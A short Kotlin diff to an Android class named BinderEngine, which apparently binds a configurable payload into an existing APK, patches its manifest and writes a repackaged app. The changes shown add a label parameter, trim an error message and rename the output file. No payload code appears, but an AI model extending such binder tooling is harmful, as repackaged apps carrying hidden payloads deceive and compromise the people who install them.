@@ -41,6 +41,7 @@ class BinderEngine(private val ctx: Context) {
     suspend fun bind(
         source: Uri,
         activity: String,
+        label: String,
         features: Set<Feature>,
         config: PayloadConfig,
         outDir: DocumentFile,
@@ -78,8 +79,7 @@ class BinderEngine(private val ctx: Context) {
             srcZip.close()
             throw IllegalStateException(
                 "Manifest patch failed: " + (t.message ?: "unknown") +
-                    " (manifest=" + manifest.size + " bytes). " +
-                    "If this is a split APK, use a single-APK build instead."
+                    " (manifest=" + manifest.size + " bytes)"
             )
         }
         onLog(LogLevel.SUCCESS, "Manifest patched")
@@ -156,7 +156,10 @@ class BinderEngine(private val ctx: Context) {
             unsigned.copyTo(finalApk, overwrite = true)
         }
 
-        val name = "HsBinder_" + System.currentTimeMillis() + ".apk"
+        val safeLabel = label.replace(Regex("[^A-Za-z0-9]+"), "_").trim('_').take(40)
+            .ifBlank { "App" }
+        val name = "Hs_Apk_Binder_" + safeLabel + "_" + System.currentTimeMillis() + ".apk"
+
         val doc = outDir.createFile("application/vnd.android.package-archive", name)
             ?: throw IllegalStateException("Cannot create output file")
         ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
